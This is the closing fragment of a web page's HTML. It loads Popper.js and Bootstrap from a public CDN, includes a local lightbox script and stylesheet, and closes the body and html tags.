<script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>



    
    <!-- Include LightBox -->
    <div>
        <script type="text/javascript" src="/assets/js/lightbox.js"></script>
        <link rel="stylesheet" href="/assets/css/lightbox.css">
    </div>
  </body>

</html>

